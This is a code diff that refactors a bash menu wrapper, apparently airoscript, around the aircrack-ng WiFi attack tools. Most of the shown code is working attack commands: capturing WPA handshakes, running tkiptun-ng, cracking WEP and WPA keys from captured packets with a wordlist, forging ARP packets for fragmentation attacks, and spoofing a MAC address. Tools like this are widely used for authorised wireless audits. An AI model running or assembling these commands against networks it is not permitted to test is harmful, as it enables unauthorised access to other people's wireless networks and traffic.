@@ -549,17 +549,14 @@ done
 	}
 
 	# 1 just capture 
-
 	function wpahandshake {
-		$clear
-		rm -rf $DUMP_PATH/$Host_MAC*
+		$clear && rm -rf $DUMP_PATH/$Host_MAC*
 		$CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Capturing data on channel:'` $Host_CHAN" $TOPLEFTBIG $BGC "$BACKGROUND_COLOR" $FGC "$DUMPING_COLOR" $EXECFLAG $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
 	}
 
 	# 2 Use tkiptun-ng
 	function tkiptunstdqos {
-		$clear
-		rm -rf $DUMP_PATH/$Host_MAC*
+		$clear && rm -rf $DUMP_PATH/$Host_MAC*
 		ifconfig $WIFICARD channel $Host_CHAN # Hope this is ok for all cards
 		$CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Executing tkiptun-ng for ap'` $Host_MAC" $TOPLEFTBIG $BGC "$BACKGROUND_COLOR" $FGC "$DUMPING_COLOR" $EXECFLAG $TKIPTUN -h $FAKE_MAC -a $Host_MAC -m $TKIPTUN_MIN_PL -n $TKIPTUN_MAX_PL  $WIFI & menufonction
 	}
@@ -582,10 +579,7 @@ function witchcrack {
 	|    3) Use aircrack-ng             |
 	|    4) Return to main menu         |
 	+-----------------------------------+
-	Option:'`"
-
-					read yn
-				
+	Option:'`" && read yn
 				case $yn in
 					1 ) wld ; break ;;
 					2 ) jtd ; break ;;
@@ -601,18 +595,11 @@ function witchcrack {
 }
 
 function selectcracking {
-	if [ "$Host_ENC" = "OPN" ] || [ "$Host_ENC" = "" ] || [ "$Host_ENC" = " OPN " ]
-	then
-		$clear
-		echo `gettext "ERROR: Network not encrypted or no network selected "`
-
+	if [ "$Host_ENC" = "OPN" ] || [ "$Host_ENC" = "" ] || [ "$Host_ENC" = " OPN " ]; then
+		$clear && echo `gettext "ERROR: Network not encrypted or no network selected "`
 	else
-		if [ "$Host_ENC" = " WEP " ] || [ "$Host_ENC" = "WEP" ]
-		then
-			crack
-		else
-			wpacrack
-		fi
+		if [ "$Host_ENC" = " WEP " ] || [ "$Host_ENC" = "WEP" ]; then crack
+		else wpacrack; fi
 	fi
 }
 
@@ -631,38 +618,19 @@ function selectcracking {
 		Option: '`"
 		read yn
 		case $yn in
-		1 ) crackptw ; $clear; break ;;
-		2 ) crackstd ; $clear; break ;;
-		3 ) crackman ; $clear; break ;;
-		* ) echo "`gettext 'Unknown response. Try again'`" ;;
+		    1 ) $TERMINAL $HOLDFLAG $TITLEFLAG "Aircracking-PTW: $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -z -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction; $clear; break ;;
+	    	2 ) $TERMINAL $HOLDFLAG $TITLEFLAG "Aircracking: $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction; $clear; break ;;
+	    	3 ) read -p "Insert Fudge Factor: " FUDGE_FACTOR 
+			read -p "`gettext 'Type encryption size (64,128...): '`" ENC_SIZE
+			$TERMINAL $HOLDFLAG $TITLEFLAG "`gettext 'Manual cracking:'` $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction ; $clear; break ;;
+	    	* ) echo "`gettext 'Unknown response. Try again'`" ;;
 		esac
 		done 
 	}
-	
-		# Those are subproducts of crack for wep.
-		function crackptw   {
-			$TERMINAL $HOLDFLAG $TITLEFLAG "Aircracking-PTW: $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -z -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
-		}
-
-		function crackstd   {
-			$TERMINAL $HOLDFLAG $TITLEFLAG "Aircracking: $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
-		}
-	
-		function crackman {
-			echo -n "type fudge factor"
-			read FUDGE_FACTOR
-			echo You typed: $FUDGE_FACTOR
-			set -- ${FUDGE_FACTOR}
-			echo -e -n "`gettext \"type encryption size 64,128 etc...\"`"
-			read ENC_SIZE
-			echo You typed: $ENC_SIZE
-			set -- ${ENC_SIZE}
-			$TERMINAL $HOLDFLAG $TITLEFLAG "`gettext 'Manual cracking:'` $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
-		}
 
 	# This is for wpa cracking
 	function wpacrack {
-		$TERMINAL $HOLDFLAG $TOPRIGHT $TITLEFLAG "Aircracking: $Host_SSID" $EXECFLAG $AIRCRACKOLD $FORCEWPAKOREK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST & menufonction # There was a -0 -s before $DPATH/$HmaC but -0 is not documented, anyway, it works, so I replaced it (-s is for showing ascii key)
+		$TERMINAL $HOLDFLAG $TOPRIGHT $TITLEFLAG "Aircracking: $Host_SSID" $EXECFLAG $AIRCRACKOLD $FORCEWPAKOREK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST & menufonction 
 	}
 	
 # This is for Fake auth  (5)  option
@@ -915,8 +883,7 @@ Option: '`"
 					* ) echo "unknown response. Try again" ;;
 				esac
 			done 
-			else
-				$clear && echo "Sorry, this function is not installed on your system"
+			else $clear && echo "Sorry, this function is not installed on your system"
 			fi
 		}
 
@@ -950,8 +917,7 @@ Option: '`"
 					aspeed[$i]=$SPEED
 					fi
 				done < $DUMP_PATH/dump-02.csv
-				echo ""
-				echo "        Select target               "
+				echo -n "\n        Select target               "
 				read choice
 					idlenght=${aidlenght[$choice]}
 					ssid=${assid[$choice]}
@@ -1069,12 +1035,8 @@ Option: '`"
 
 	# 8.
 	function airmoncheck {
-		if [ "$TYPE" = "RalinkUSB" ]; then $AIRMON check $WIFICARD
-		elif [ "$TYPE" = "Ralinkb/g" ]; then $AIRMON check $WIFICARD
-		elif [ "$DRIVER" = "PCI" ]; then $AIRMON check $WIFICARD
-		elif [ "$TYPE" = "Atherosmadwifi-ng" ]; then $AIRMON check wifi0
-		else $AIRMON check $WIFICARD
-		fi
+		if [ "$TYPE" = "Atherosmadwifi-ng" ]; then $AIRMON check wifi0
+		else $AIRMON check $WIFICARD; fi
 	}
 
 changedumppath(){
@@ -1117,8 +1079,7 @@ Option: '`"
 
 
 	function fragnoclientend {
-		if [ "$Host_MAC" = "" ]
-		then
+		if [ "$Host_MAC" = "" ]; then
 			$clear && echo `gettext 'ERROR: You must select a target first'`
 		else
 		$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
@@ -1127,7 +1088,6 @@ Option: '`"
 	}
 
 	function fragmentationattackend {
-
 		if [ "$Host_MAC" = "" ]; then
 			$clear;	echo `gettext 'ERROR: You must select a target first' `
 		else
@@ -1175,7 +1135,6 @@ Option: '`"
 		echo "#######################################"
 		echo -e "`gettext \"###       Please enter SSID         ###\"`"
 		read Host_SSID
-		set -- ${Host_SSID}
 		$clear
 	}
 
@@ -1196,13 +1155,10 @@ function doauto {
 
 		# Now the one on wich you select target
 		if [ -e $DUMP_PATH/dump-01.csv ];then
-			Parseforap
-			$clear
+			Parseforap && $clear
 			if [ "$Host_SSID" = $'\r' ]; then blankssid;
 			elif [ "$Host_SSID" = "No SSID has been detected" ]; then blankssid; fi
-			target
-			choosetarget
-			$clear
+			target && choosetarget && $clear
 		else
 			$clear
 			echo "ERROR: You have to scan for targets first"
@@ -1222,10 +1178,11 @@ checkforcemac() {
 
 function guess_idata(){
 	AIROUTPUT=$($AIRMON $1 $WIFICARD|grep -A 1 $WIFICARD);
-	TYPE=`echo \"$AIROUTPUT\" | grep monitor      | awk '{print $2 $3}'`
-	DRIVER=`echo \"$AIROUTPUT\" | grep monitor      | awk '{print $4}'`
-	tmpwifi=`echo \"$AIROUTPUT\" | awk {'print $NF'} | cut -d ")" -f1`
-    #if [ "$wifi" =~ (.*)[0-9] ];  then WIFI=$tmpwifi; fi
+	export TYPE=`echo \"$AIROUTPUT\" | grep monitor      | awk '{print $2 $3}'`
+	export DRIVER=`echo \"$AIROUTPUT\" | grep monitor      | awk '{print $4}'`
+	export tmpwifi=`echo \"$AIROUTPUT\" | awk {'print $NF'} | cut -d ")" -f1`
+    #if [ "$wifi" =~ (.*)[0-9] ];  then WIFI=$tmpwifi; fi # FIXME
+    WIFI=$tmpwifi # FIXME
 }
 
 function setinterface {
@@ -1327,6 +1284,3 @@ function checkdir {
         fi
     fi
 }
-
-
-
